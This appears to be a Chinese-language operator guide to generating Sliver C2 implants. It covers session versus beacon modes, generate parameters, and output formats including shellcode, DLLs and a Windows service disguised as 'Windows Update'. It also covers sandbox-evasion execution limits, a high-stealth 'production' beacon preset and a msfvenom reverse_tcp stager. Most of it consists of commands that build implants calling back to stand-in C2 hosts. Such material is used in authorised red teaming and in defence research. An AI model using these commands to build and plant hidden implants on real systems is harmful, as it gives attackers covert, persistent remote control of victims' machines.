# Implant 生成详解

## Session vs Beacon 详细对比

```
+------------------+------------------------+------------------------+
| 维度             | Session                | Beacon                 |
+------------------+------------------------+------------------------+
| 交互方式         | 实时双向通信           | 异步任务队列           |
| 网络模式         | 持久连接               | 定期轮询回连           |
| 默认间隔         | 无 (始终在线)          | 60 秒 (可配置)         |
| 隐蔽性           | 较低 (持续流量)        | 较高 (间歇流量)        |
| 支持功能         | 全部命令               | 大部分 (部分需切换)    |
| shell            | 直接支持               | 需 interactive 切换    |
| portfwd / socks5 | 直接支持               | 需 interactive 切换    |
| pivot            | 支持                   | 不支持                 |
| 检测风险         | 长连接易被发现         | 心跳模式较难检测       |
| 适用场景         | 主动交互/调试/穿透     | 长期潜伏/生产环境      |
+------------------+------------------------+------------------------+
```

---

## generate 命令参数详解

### 基础参数

```bash
sliver > generate [beacon] [选项]
```

| 参数 | 说明 | 示例 |
|------|------|------|
| `--mtls` | mTLS C2 端点 | `--mtls example.com:8888` |
| `--http` | HTTP(S) C2 端点 | `--http example.com` |
| `--dns` | DNS C2 端点 (FQDN) | `--dns 1.example.com.` |
| `--wg` | WireGuard C2 端点 | `--wg example.com` |
| `--tcp-pivot` | TCP Pivot 端点 | `--tcp-pivot 10.0.0.1:9898` |
| `--named-pipe` | Named Pipe 端点 | `--named-pipe host/pipe/name` |
| `--os` | 目标操作系统 | `windows / linux / mac` |
| `--arch` | 目标架构 | `amd64 / 386 / arm64` |
| `--format` | 输出格式 | `exe / shared / shellcode / service` |
| `--save` | 保存路径 | `--save /tmp` |
| `--name` | 自定义 implant 名称 | `--name svchost` |

### Beacon 专用参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `--seconds` | 回连间隔 (秒) | 60 |
| `--jitter` | 随机抖动百分比 | 30 |

```bash
# Beacon 示例
sliver > generate beacon --mtls example.com --seconds 30 --jitter 10
```

### 网络参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `--reconnect` | 重连等待秒数 | 60 |
| `--max-errors` | 最大错误次数 | 1000 |

---

## 输出格式

### exe (Windows PE / ELF / Mach-O)

默认格式，生成独立可执行文件。

```bash
# Windows
sliver > generate --mtls example.com --os windows --format exe

# Linux
sliver > generate --mtls example.com --os linux --format exe

# macOS
sliver > generate --mtls example.com --os mac --format exe
```

### shared (DLL / SO)

共享库格式，可用于 DLL 侧加载或 LD_PRELOAD。

```bash
# Windows DLL
sliver > generate --mtls example.com --os windows --format shared

# Linux SO
sliver > generate --mtls example.com --os linux --format shared
```

### shellcode (原始 shellcode)

原始位置无关代码，用于注入场景。

```bash
# 生成 shellcode
sliver > generate --mtls example.com --os windows --format shellcode --save /tmp
```

适用于: 进程注入、Loader 加载、自定义投递方式。

### service (Windows 服务)

Windows 服务格式，可通过 SCM 安装。

```bash
# 生成 Windows 服务
sliver > generate --mtls example.com --os windows --format service --name "Windows Update"
```

---

## 规避选项

### --limit-datetime

限制 implant 仅在指定日期前执行，过期后自动退出。

```bash
sliver > generate --mtls example.com --limit-datetime "2024-12-31"
```

### --limit-domainjoined

限制 implant 仅在域加入的机器上执行，防止沙箱触发。

```bash
sliver > generate --mtls example.com --limit-domainjoined
```

### --limit-hostname

限制 implant 仅在指定主机名的机器上执行。

```bash
sliver > generate --mtls example.com --limit-hostname "TARGET-PC"
```

### --limit-username

限制 implant 仅在指定用户上下文中执行。

```bash
sliver > generate --mtls example.com --limit-username "admin"
```

---

## Debug 与符号选项

```bash
# 启用调试模式 (排查连接问题)
sliver > generate --mtls example.com --debug

# 跳过符号混淆 (加快编译，减少内存占用)
sliver > generate --mtls example.com --skip-symbols
```

注意: `--debug` 会在 implant 中包含调试信息，仅用于测试环境。

---

## Metasploit Stager 兼容

Sliver 支持 Metasploit 兼容的分阶段加载。

```bash
# 1. 创建 stager profile
sliver > profiles new --mtls example.com --format shellcode stager-profile

# 2. 启动 stager 监听器
sliver > stage-listener --url tcp://0.0.0.0:8443 --profile stager-profile

# 3. 使用 msfvenom 生成兼容 stager
msfvenom -p windows/x64/custom/reverse_tcp LHOST=example.com LPORT=8443 -f exe -o stager.exe
```

---

## Implant 管理

```bash
# 查看已生成的 implant
sliver > implants

# 查看 implant 详细配置
sliver > implants IMPLANT_NAME

# 重新下载已生成的 implant
sliver > regenerate --save /tmp IMPLANT_NAME
```

---

## 配置预设

### 生产环境 (高隐蔽)

```bash
sliver > generate beacon \
  --mtls primary.com \
  --http backup.com \
  --seconds 300 \
  --jitter 50 \
  --max-errors 10 \
  --limit-domainjoined \
  --os windows \
  --arch amd64 \
  --save /tmp
```

### 测试环境 (快速调试)

```bash
sliver > generate \
  --mtls 192.168.1.100 \
  --debug \
  --skip-symbols \
  --os windows \
  --save /tmp
```

### 多平台生成

```bash
# Windows
sliver > generate --mtls example.com --os windows --arch amd64

# Linux
sliver > generate --mtls example.com --os linux --arch amd64

# macOS Intel
sliver > generate --mtls example.com --os mac --arch amd64

# macOS Apple Silicon
sliver > generate --mtls example.com --os mac --arch arm64
```
